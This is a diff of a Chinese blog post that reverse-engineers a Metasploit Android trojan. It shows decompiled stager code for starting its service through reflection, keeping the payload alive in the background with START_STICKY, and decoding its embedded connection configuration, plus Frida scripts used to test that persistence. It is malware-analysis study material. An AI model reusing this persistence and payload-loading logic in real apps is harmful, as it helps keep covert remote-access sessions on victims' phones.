class_">c</span>(v1));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            MainService.startService(v0_3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>尝试通过反射加载<code>android.app.ActivityThread</code>中的<code>currentApplication</code>方法并通过<code>invoke</code>执行，转化为context类型保存，如果获取不到Context，则通过主线程的 <code>Handler</code> 将一个新的 <code>Runnable</code> 对象发送到消息队列中，以便在主线程中执行，c中的逻辑为在运行时尝试通过之前传递进来的 <code>Method</code> 对象获取 <code>Context</code> 对象，并在获取成功时启动 <code>MainService</code> 服务</li>
+<li>尝试通过反射加载 <code>android.app.ActivityThread</code>  中的 <code>currentApplication</code>  方法并通过 <code>invoke</code>  执行，转化为 context 类型保存，如果获取不到 Context，则通过主线程的  <code>Handler</code>  将一个新的  <code>Runnable</code>  对象发送到消息队列中，以便在主线程中执行，c 中的逻辑为在运行时尝试通过之前传递进来的  <code>Method</code>  对象获取  <code>Context</code>  对象，并在获取成功时启动  <code>MainService</code>  服务</li>
 </ul>
-<pre><code class="java">final class c implements Runnable &#123;
-    private Method a;
-
-    c(Method arg1) &#123;
-        this.a = arg1;
-        super();
-    &#125;
-
-    @Override
-    public final void run() &#123;
-        try &#123;
-            Context v0_1 = (Context)this.a.invoke(null, null);
-            if(v0_1 != null) &#123;
-                MainService.startService(v0_1);
-                return;
-            &#125;
-        &#125;
-        catch(Exception v0) &#123;
-            return;
-        &#125;
-    &#125;
-&#125;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">c</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Method a;</span><br><span class="line"></span><br><span class="line">    c(Method arg1) &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = arg1;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">v0_1</span> <span class="operator">=</span> (Context)<span class="built_in">this</span>.a.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span>(v0_1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                MainService.startService(v0_1);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>java 反射：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/812647">深入理解Java中的反射机制及使用原理！详细解析invoke方法的执行和使用-阿里云开发者社区 (aliyun.com)</a></p>
+<p>java 反射：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/812647">深入理解 Java 中的反射机制及使用原理！详细解析 invoke 方法的执行和使用 - 阿里云开发者社区 (aliyun.com)</a></p>
 <ul>
-<li>允许运行中的Java程序获取自身信息,并可以操作类或者对象的内部属性</li>
-<li>程序中的对象一般都是在编译时就确定下来,Java反射机制可以动态地创建对象并且调用相关属性,这些对象的类型在编译时是未知的</li>
-<li>也就是说 ，可以通过反射机制<strong>直接创建对象,即使这个对象类型在编译时是未知的</strong></li>
+<li>允许运行中的 Java 程序获取自身信息，并可以操作类或者对象的内部属性</li>
+<li>程序中的对象一般都是在编译时就确定下来，Java 反射机制可以动态地创建对象并且调用相关属性，这些对象的类型在编译时是未知的</li>
+<li>也就是说 ，可以通过反射机制<strong>直接创建对象，即使这个对象类型在编译时是未知的</strong></li>
 </ul>
-<p>类的加载机制：<strong>JVM</strong>使用<strong>ClassLoader</strong>将字节码文件,即 <strong>class</strong>文件加载到方法区内存中</p>
-<pre><code class="java">Class clazz = ClassLoader.getSystemClassLoader().loadClass(&quot;com.mypackage.MyClass&quot;);
-</code></pre>
-<p><strong>ClassLoader</strong>类根据类的完全限定名加载类并返回一个<strong>Class</strong>对象</p>
+<p>类的加载机制：<strong>JVM</strong> 使用<strong> ClassLoader</strong> 将字节码文件，即 <strong>class</strong> 文件加载到方法区内存中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.mypackage.MyClass&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>ClassLoader</strong> 类根据类的完全限定名加载类并返回一个<strong> Class</strong> 对象</p>
 <p>反射的用途：</p>
 <ul>
-<li>很多框架都是配置化的,通过<strong>XML</strong>文件配置<strong>Bean</strong></li>
-<li>为了保证框架的通用性,需要根据配置文件加载不同的对象或者类,调用不同的方法</li>
-<li>要运用反射,运行时动态加载需要加载的对象</li>
+<li>很多框架都是配置化的，通过<strong> XML</strong> 文件配置<strong> Bean</strong></li>
+<li>为了保证框架的通用性，需要根据配置文件加载不同的对象或者类，调用不同的方法</li>
+<li>要运用反射，运行时动态加载需要加载的对象</li>
 </ul>
 <p><strong>这里主要就是用③，实现动态加载，反射是各种容器实现的核心</strong></p>
-<p>从类中获取一个方法后,可以使用<strong>invoke()</strong> 来调用这个方法</p>
+<p>从类中获取一个方法后，可以使用<strong> invoke ()</strong> 来调用这个方法</p>
 </blockquote>
-<pre><code class="java">public int onStartCommand(Intent arg2, int arg3, int arg4) &#123;
-    Payload.start(this);
-    return 1;
-&#125;
-</code></pre>
-<p><code>Service</code> 类的重写方法，用于处理启动服务的命令。<code>1</code> 表示如果服务被杀死了，系统尝试重新创建服务并调用 <code>onStartCommand()</code> 方法；即这里会维持在后台循环启动payload</p>
-<p>我们知道，frida会悬挂进程并多起四个线程（可以自行调试，这个地方还没有具体了解原理，不过需要注意）那么我们编辑运行基本的一个脚本就会观察到有</p>
-<pre><code class="javascript">setImmediate(function()&#123;
-    console.log(&quot;lld [*]&quot;);
-    Java.perform(function()&#123;
-        var myClass = Java.use(&quot;com.metasploit.stage.MainActivity&quot;);
-        myClass.implementation = function(v)&#123;
-        &#125;
-    &#125;)
-&#125;)
-</code></pre>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424133646117.png" alt="image-20240424133646117"></p>
-<p>后台重新加载了几次payload，使得vps重新接收到了sessions，随即关闭掉前面的链接，可以认为我们的推断是基本正确的，这部分实现了马的持久化</p>
-<p>测试payload的重加载：</p>
-<pre><code class="javascript">setImmediate(function()&#123;
-    console.log(&quot;lld [*]&quot;);
-    Java.perform(function()&#123;
-        var myClass = Java.use(&quot;com.metasploit.stage.MainService&quot;);
-        myClass.onStartCommand.implementation = function(arg2, arg3, arg4)&#123;
-            send(&#39;com.myclass.onStartCommand.implementation&#39;);
-            var ret = this.onStartCommand(arg2, arg3, arg4);
-            send(&quot;result:&quot;+2);
-            return 2;
-        &#125;
-    &#125;)
-&#125;)
-</code></pre>
-<img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424142410325.png" alt="image-20240424142410325" style="zoom:33%;">
-
-<p>修改返回值，服务会快速重置，但是新的连接无法维持，原因是我们hook了返回值为<code>START_NOT_STICKY</code></p>
-<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><h6 id="class-b"><a href="#class-b" class="headerlink" title="class b"></a>class b</h6><pre><code class="java">private static int a(byte[] arg4, int arg5) &#123;
-    int v0 = 0;
-    int v1 = 0;
-    while(v0 &lt; 4) &#123;
-        v1 |= (arg4[v0 + arg5] &amp; 0xFF) &lt;&lt; (v0 &lt;&lt; 3);
-        ++v0;
-    &#125;
-
-    return v1;
-&#125;
-</code></pre>
-<p>这里明显是一个大小端序转化，基本上就是在对payload做数据处理，先大体手动还原符号，看起来就是简单编码还原payload内容并获取信息：</p>
-<pre><code class="java">package com.metasploit.stage;
-
-import java.io.UnsupportedEncodingException;
-import java.util.concurrent.TimeUnit;
-
-public final class b &#123;
-    private static final long timestamp;
-
-    static &#123;
-        b.timestamp = TimeUnit.SECONDS.toMillis(1L);
-    &#125;
-
-    private static int change_endian(byte[] arg4, int arg5) &#123;
-        int v0 = 0;
-        int v1 = 0;
-        while(v0 &lt; 4) &#123;
-            v1 |= (arg4[v0 + arg5] &amp; 0xFF) &lt;&lt; (v0 &lt;&lt; 3);
-            ++v0;
-        &#125;
-
-        return v1;
-    &#125;
-
-    public static a a(byte[] arg11) &#123;
-        a v3 = new a();
-        v3.a = b.change_endian(arg11, 0);
-        long v6 = (long)b.change_endian(arg11, 12);
-        v3.b = b.timestamp * v6;
-        b.copy_array(arg11, 16, 16);
-        b.copy_array(arg11, 0x20, 16);
-        int v0 = 0x30;
-        if((v3.a &amp; 1) != 0) &#123;
-            v3.c = b.encode(arg11, 8000, 100);
-        &#125;
-
-        while(arg11[v0] != 0) &#123;
-            g v4 = new g();
-            v4.a = b.encode(arg11, v0, 0x200);
-            int v0_1 = v0 + 0x204;
-            long v8 = (long)b.change_endian(arg11, v0_1);
-            v4.b = b.timestamp * v8;
-            int v0_2 = v0_1 + 4;
-            long v8_1 = (long)b.change_endian(arg11, v0_2);
-            v4.c = b.timestamp * v8_1;
-            v0 = v0_2 + 4;
-            if(v4.a.startsWith(&quot;http&quot;)) &#123;
-                b.encode(arg11, v0, 0x80);
-                int v0_3 = v0 + 0x80;
-                b.encode(arg11, v0_3, 0x40);
-                int v0_4 = v0_3 + 0x40;
-                b.encode(arg11, v0_4, 0x40);
-                int v0_5 = v0_4 + 0x40;
-                v4.d = b.encode(arg11, v0_5, 0x100);
-                int v0_6 = v0_5 + 0x100;
-                v4.e = null;
-                byte[] v5 = b.copy_array(arg11, v0_6, 20);
-                int v2 = v0_6 + 20;
-                int v0_7;
-                for(v0_7 = 0; v0_7 &lt; v5.length; ++v0_7) &#123;
-                    if(v5[v0_7] != 0) &#123;
-                        v4.e = v5;
-                        break;
-                    &#125;
-                &#125;
-
-                StringBuilder v5_1 = new StringBuilder();
-                int v0_8;
-                for(v0_8 = v2; v0_8 &lt; arg11.length; ++v0_8) &#123;
-                    byte v7 = arg11[v0_8];
-                    if(v7 == 0) &#123;
-                        break;
-                    &#125;
-
-                    v5_1.append(((char)(v7 &amp; 0xFF)));
-                &#125;
-
-                String v0_9 = v5_1.toString();
-                v4.f = v0_9;
-                v0 = v0_9.length() + v2;
-            &#125;
-
-            v3.d.add(v4);
-        &#125;
-
-        return v3;
-    &#125;
-
-    private static String encode(byte[] arg3, int arg4, int arg5) &#123;
-        byte[] v0 = b.copy_array(arg3, arg4, arg5);
-        try &#123;
-            return new String(v0, &quot;ISO-8859-1&quot;).trim();
-        &#125;
-        catch(UnsupportedEncodingException v1) &#123;
-            return new String(v0).trim();
-        &#125;
-    &#125;
-
-    private static byte[] copy_array(byte[] arg2, int arg3, int arg4) &#123;
-        byte[] v0 = new byte[arg4];
-        System.arraycopy(arg2, arg3, v0, 0, arg4);
-        return v0;
-    &#125;
-&#125;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent arg2, <span class="type">int</span> arg3, <span class="type">int</span> arg4)</span> &#123;</span><br><span class="line">    Payload.start(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>Service</code>  类的重写方法，用于处理启动服务的命令。 <code>1</code>  表示如果服务被杀死了，系统尝试重新创建服务并调用  <code>onStartCommand()</code>  方法；即这里会维持在后台循环启动 payload</p>
+<p>我们知道，frida 会悬挂进程并多起四个线程（可以自行调试，这个地方还没有具体了解原理，不过需要注意）那么我们编辑运行基本的一个脚本就会观察到有</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setImmediate</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lld [*]&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> myClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.metasploit.stage.MainActivity&quot;</span>);</span><br><span class="line">        myClass.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">v</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424133646117.png" alt="image-20240424133646117"></p>
+<p>后台重新加载了几次 payload，使得 vps 重新接收到了 sessions，随即关闭掉前面的链接，可以认为我们的推断是基本正确的，这部分实现了马的持久化</p>
+<p>测试 payload 的重加载：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setImmediate</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lld [*]&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> myClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.metasploit.stage.MainService&quot;</span>);</span><br><span class="line">        myClass.<span class="property">onStartCommand</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg2, arg3, arg4</span>)&#123;</span><br><span class="line">            <span class="title function_">send</span>(<span class="string">&#x27;com.myclass.onStartCommand.implementation&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">onStartCommand</span>(arg2, arg3, arg4);</span><br><span class="line">            <span class="title function_">send</span>(<span class="string">&quot;result:&quot;</span>+<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<img loading="lazy" data-src="msf-Android马分析/image-20240424142410325.png" alt="image-20240424142410325" style="zoom:33%;">
+<p>修改返回值，服务会快速重置，但是新的连接无法维持，原因是我们 hook 了返回值为 <code>START_NOT_STICKY</code></p>
+<h5 id="payload"><a class="markdownIt-Anchor" href="#payload">#</a> Payload</h5>
+<h6 id="class-b"><a class="markdownIt-Anchor" href="#class-b">#</a> class b</h6>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">a</span><span class="params">(<span class="type">byte</span>[] arg4, <span class="type">int</span> arg5)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(v0 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        v1 |= (arg4[v0 + arg5] &amp; <span class="number">0xFF</span>) &lt;&lt; (v0 &lt;&lt; <span class="number">3</span>);</span><br><span class="line">        ++v0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里明显是一个大小端序转化，基本上就是在对 payload 做数据处理，先大体手动还原符号，看起来就是简单编码还原 payload 内容并获取信息：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.metasploit.stage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">b</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> timestamp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        b.timestamp = TimeUnit.SECONDS.toMillis(<span class="number">1L</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">change_endian</span><span class="params">(<span class="type">byte</span>[] arg4, <span class="type">int</span> arg5)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(v0 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            v1 |= (arg4[v0 + arg5] &amp; <span class="number">0xFF</span>) &lt;&lt; (v0 &lt;&lt; <span class="number">3</span>);</span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> a <span class="title function_">a</span><span class="params">(<span class="type">byte</span>[] arg11)</span> &#123;</span><br><span class="line">        <span class="type">a</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">a</span>();</span><br><span class="line">        v3.a = b.change_endian(arg11, <span class="number">0</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">v6</span> <span class="operator">=</span> (<span class="type">long</span>)b.change_endian(arg11, <span class="number">12</span>);</span><br><span class="line">        v3.b = b.timestamp * v6;</span><br><span class="line">        b.copy_array(arg11, <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">        b.copy_array(arg11, <span class="number">0x20</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">0x30</span>;</span><br><span class="line">        <span class="keyword">if</span>((v3.a &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            v3.c = b.encode(arg11, <span class="number">8000</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(arg11[v0] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">g</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">g</span>();</span><br><span class="line">            v4.a = b.encode(arg11, v0, <span class="number">0x200</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">v0_1</span> <span class="operator">=</span> v0 + <span class="number">0x204</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">v8</span> <span class="operator">=</span> (<span class="type">long</span>)b.change_endian(arg11, v0_1);</span><br><span class="line">            v4.b = b.timestamp * v8;</span><br><span class="line">            <span class="type">int</span> <span class="variable">v0_2</span> <span class="operator">=</span> v0_1 + <span class="number">4</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">v8_1</span> <span class="operator">=</span> (<span class="type">long</span>)b.change_endian(arg11, v0_2);</span><br><span class="line">            v4.c = b.timestamp * v8_1;</span><br><span class="line">            v0 = v0_2 + <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(v4.a.startsWith(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                b.encode(arg11, v0, <span class="number">0x80</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v0_3</span> <span class="operator">=</span> v0 + <span class="number">0x80</span>;</span><br><span class="line">                b.encode(arg11, v0_3, <span class="number">0x40</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v0_4</span> <span class="operator">=</span> v0_3 + <span class="number">0x40</span>;</span><br><span class="line">                b.encode(arg11, v0_4, <span class="number">0x40</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v0_5</span> <span class="operator">=</span> v0_4 + <span class="number">0x40</span>;</span><br><span class="line">                v4.d = b.encode(arg11, v0_5, <span class="number">0x100</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v0_6</span> <span class="operator">=</span> v0_5 + <span class="number">0x100</span>;</span><br><span class="line">                v4.e = <span class="literal">null</span>;</span><br><span class="line">                <span class="type">byte</span>[] v5 = b.copy_array(arg11, v0_6, <span class="number">20</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> v0_6 + <span class="number">20</span>;</span><br><span class="line">                <span class="type">int</span> v0_7;</span><br><span class="line">                <span class="keyword">for</span>(v0_7 = <span class="number">0</span>; v0_7 &lt; v5.length; ++v0_7) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v5[v0_7] != <span class="number">0</span>) &#123;</span><br><span class="line">                        v4.e = v5;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">v5_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">int</span> v0_8;</span><br><span class="line">                <span class="keyword">for</span>(v0_8 = v2; v0_8 &lt; arg11.length; ++v0_8) &#123;</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">v7</span> <span class="operator">=</span> arg11[v0_8];</span><br><span class="line">                    <span class="keyword">if</span>(v7 == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v5_1.append(((<span class="type">char</span>)(v7 &amp; <span class="number">0xFF</span>)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">v0_9</span> <span class="operator">=</span> v5_1.toString();</span><br><span class="line">                v4.f = v0_9;</span><br><span class="line">                v0 = v0_9.length() + v2;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v3.d.add(v4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(<span class="type">byte</span>[] arg3, <span class="type">int</span> arg4, <span class="type">int</span> arg5)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] v0 = b.copy_array(arg3, arg4, arg5);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(v0, <span class="string">&quot;ISO-8859-1&quot;</span>).trim();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(UnsupportedEncodingException v1) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(v0).trim();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] copy_array(<span class="type">byte</span>[] arg2, <span class="type">int</span> arg3, <span class="type">int</span> arg4) &#123;</span><br><span class="line">        <span class="type">byte</span>[] v0 = <span class="keyword">new</span> <span class="title class_">byte</span>[arg4];</span><br><span class="line">        System.arraycopy(arg2, arg3, v0, <span class="number">0</span>, arg4);</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里重载函数比较多，可以直接拿脚本批量打印一下看，</p>
-<pre><code class="javascript">function logInf(classs)&#123;
-    Java.perform(function ()&#123;
-        var Modifier = Java.use(&quot;com.metasploit.stage.b&quot;);
-        var modifiers = classs.getModifiers();
-        classs.setAccessible(true);
-        if (Modifier.isStatic(modifiers)) &#123;
-            // 静态字段
-            var value = classs.get(null);
-            console.log(classs + &quot; =&gt;&quot;  + value)
-        &#125; else &#123;
-             console.log(classs)
-        &#125;
-    &#125;)
-&#125;
-function getAllsonClass(classs)&#123;
-    console.log(&#39;\n&#39;)
-    console.log(&quot;查询到子类  =&gt;&quot; + classs.getName())
-    hookClass(String(classs.getName()))
-&#125;
-var thisclass = null;
-//&quot;java.security.MessageDigest&quot;
-function hookClass(CLASS)&#123;
-Java.perform(function()&#123;
-    var classStudent = Java.use(CLASS);
-    var classs = classStudent.class;
- 
-    //获取所有内部类
-    var innerClasses = classs.getDeclaredClasses();
-    if(innerClasses.length &gt; 0)&#123;
-        innerClasses.forEach(getAllsonClass);
-    &#125;
-    console.log(&quot;===========&quot; + classs + &quot;中的所有变量==============&quot;)
-    //输出所有变量
-    classs.getDeclaredFields().forEach(logInf)
-    console.log(&quot;===========&quot; + classs +  &quot;的所有方法==============&quot;)
-    //输出所有方法,并hook
-    classs.getDeclaredMethods().forEach(function(method)&#123;
-        console.log(method)
-       var methodsName = method.getName();
-       var overloads  = classStudent[methodsName].overloads;
-    //    console.log(overloads.length)
-       for (var i=0; i&lt; overloads.length; i++)&#123;
